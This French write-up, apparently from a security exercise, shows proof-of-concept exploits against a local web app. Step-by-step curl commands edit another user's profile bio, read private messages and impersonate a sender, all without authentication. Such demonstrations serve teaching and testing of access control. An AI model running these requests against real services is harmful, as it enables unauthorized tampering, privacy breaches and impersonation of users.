# Exploit par Ève

Dans cette application, on s'attend à ce que:
- Seul l'utilisateur "bob" puisse modifier son profil
- Tout le monde puisse voir les profils des autres utilisateurs

Si on arrive à modifier le profil de "bob" sans être connecté en tant que "bob", nous avons alors un exploit sur le contrôle d'accès.

## Contexte: 

Bob s'est inscrit et a défini sa bio et son orientation.

```bash
curl -X POST http://localhost:8080/api/id/signup \
    -H "Content-Type: application/json" \
    -d '{
      "nomUtilisateur": "bob",
      "motDePasse": "password123"
    }' ;
curl -X POST http://localhost:8080/api/profil/bio \
    -H "Content-Type: application/json" \
    -d '{
      "nomUtilisateur": "bob",
      "bio": "Je suis Bob, j'\''aime cuisiner et prendre des marches."
    }' ;
curl -X POST http://localhost:8080/api/profil/orientation \
    -H "Content-Type: application/json" \
    -d '{
      "nomUtilisateur": "bob",
      "orientation": "hommes"
    }'
```

## Exploit:
1. Lister tous les profils pour trouver le nom d'utilisateur de Bob
```bash
curl -X GET http://localhost:8080/api/profils/hommes
```
2. Modifier la bio de Bob sans être connecté en tant que Bob
```bash
curl -X POST http://localhost:8080/api/profil/bio \
    -H "Content-Type: application/json" \
    -d '{
      "nomUtilisateur": "bob",
      "bio": "Je suis Bob, je suis responsable pour les pires saloperies de l'\''univers."
    }'
```
3. Vérifier que la bio de Bob a été modifiée
```bash
curl -X GET http://localhost:8080/api/profile/bob
```

On a réussi à modifier la bio de Bob sans connaître son mot de passe.

L'attaquant n'a même pas besoin de compte dans l'application.

---

## Exploit sur les messages privés

### Contexte:

Alice et Bob se sont inscrits. Alice a envoyé un message privé à Bob.

```bash
curl -X POST http://localhost:8080/api/id/signup \
    -H "Content-Type: application/json" \
    -d '{
      "nomUtilisateur": "alice",
      "motDePasse": "password123"
    }' ;
curl -X POST http://localhost:8080/api/id/signup \
    -H "Content-Type: application/json" \
    -d '{
      "nomUtilisateur": "bob",
      "motDePasse": "password123"
    }' ;
curl -X POST http://localhost:8080/api/messages \
    -H "Content-Type: application/json" \
    -d '{
      "expediteur": "alice",
      "destinataire": "bob",
      "contenu": "Salut Bob, on se voit ce soir au resto?"
    }'
```

### Exploit:

1. Lire un message privé entre Alice et Bob sans aucune connexion
```bash
curl -X GET http://localhost:8080/api/messages/1
```

2. Lire toute la boîte de réception de Bob sans aucune connexion
```bash
curl -X GET "http://localhost:8080/api/messages?utilisateur=bob"
```

3. Envoyer un message en se faisant passer pour Alice, sans connaître son mot de passe
```bash
curl -X POST http://localhost:8080/api/messages \
    -H "Content-Type: application/json" \
    -d '{
      "expediteur": "alice",
      "destinataire": "bob",
      "contenu": "Faux message envoyé par un attaquant"
    }'
```

Aucune authentification n'est requise. N'importe qui peut lire tous les messages
et usurper l'identité de n'importe quel expéditeur.
